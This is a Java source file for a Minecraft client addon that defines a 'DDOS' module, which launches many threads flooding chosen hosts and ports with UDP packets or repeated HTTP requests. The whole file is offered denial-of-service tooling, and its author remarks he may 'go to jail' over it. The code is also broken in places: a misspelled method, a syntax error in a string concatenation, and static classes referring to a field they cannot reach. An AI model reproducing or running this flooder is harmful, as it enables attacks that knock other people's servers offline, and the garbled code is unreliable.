package pwn.noobs.trouserstreak.modules;

import pwn.noobs.trouserstreak.utils.HttpUtils;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.meteorclient.systems.modules.ModuleManager;
import meteordevelopment.orbit.EventHandler;
import java.net.*;
import java.io.*;
import java.util.*;

public class DDOS extends Module {
    private enum Mode {
        Smurf, HTTP
    }

    private final Setting<List<String>> targets = register(new ListSetting.Builder<String>()
            .name("targets")
            .description("The list of target IP addresses or host names.")
            .defaultValue(Collections.singletonList("127.0.0.1"))
            .build()
    );

    private final Setting<Integer> port = register(new IntSetting.Builder()
            .name("port")
            .description("The target port.")
            .defaultValue(80)
            .min(1)
            .max(65535)
            .sliderMin(1)
            .sliderMax(65535)
            .build()
    );

    private final Setting<Integer> numOfBots = register(new IntSetting.Builder()
            .name("num-of-bots")
            .description("The number of bots to create.")
            .defaultValue(10)
            .min(1)
            .sliderMin(1)
            .build()
    );

    private final Setting<Mode> mode = register(new EnumSetting.Builder<Mode>()
            .name("mode")
            .description("The mode of attack.")
            .defaultValue(Mode.Smurf)
            .build()
    );

    private List<Bot> bots;

    public DDOS() {
        super(Trouser.Main, "DDOS", "EDGE MODULE LEAK- By Codeman04 || Spams a target with network packets using various attack modes.");
    }

    @Override
    public void onActivate() {
        bots = new ArrayList<>();
        for (int i = 0; i < numOfBots.get(); i++) {
            switch (mode.get()) {
                case Smurf:
                    bots.add(new SmurfBot(targets.get(), port.get()));
                    break;
                case HTTP:
                    bots.add(new HttpBot(targets.get(), port.get()));
                    break;
                
            }
        }
        for (Bot bot : bots) {
            new Thread(bot).start();
        }
    }

    @Override
    public void onDeactivate() {
        for (Bot bot : bots) {
            bot.stop();
        }
    }

    private abstract static class Bot implements Runnable {
        protected final List<String> targets;
        protected final int port;
        protected boolean running;

        public Bot(List<String> targets, int port) {
            this.targets = targets;
            this.port = port;
            this.running = true;
        }

        public abstract void attack(String target, int port) throws IOException;

        public void stop() {
            running = false;
        }

        @Override
        public void run() {
            while (running) {
                for (String target : targets) {
                    try {
                        attack(target, port);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }

    private static class SmurfBot extends Bot {
        public SmurfBot(List<String> targets, int port) {
            super(targets, port);
        }

        @Override
        public void attack(String target, int port) throws IOException {
            byte[] data = new byte[1024];
            Arrays.fill(data, (byte) 'A');

            DatagramPacket packet = new DatagramPacket(data, data.length, InetAddress.getByName(target), port);
            DatagramSocket socket = new DatagramSocket();

            while (running) {
                socket.send(packet);
                mc.player.sendChatMessgae("[EDGE] Smurf attack sent to" + target + ":" + port + );
            }

            socket.close();
        }
    }
    private static class HttpBot extends Bot {
        public HttpBot(List<String> targets, int port) {
            super(targets, port);
        }

        @Override
    public void attack(String target, int port) throws IOException {
        while (running) {
            try {
                HttpUtils.get("http://" + target + ":" + port);
                mc.player.sendChatMessage("[EDGE] HTTP attack sent to " + target + ":" + port);
                // god damnit im gonna go to jail over this shit
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}

}
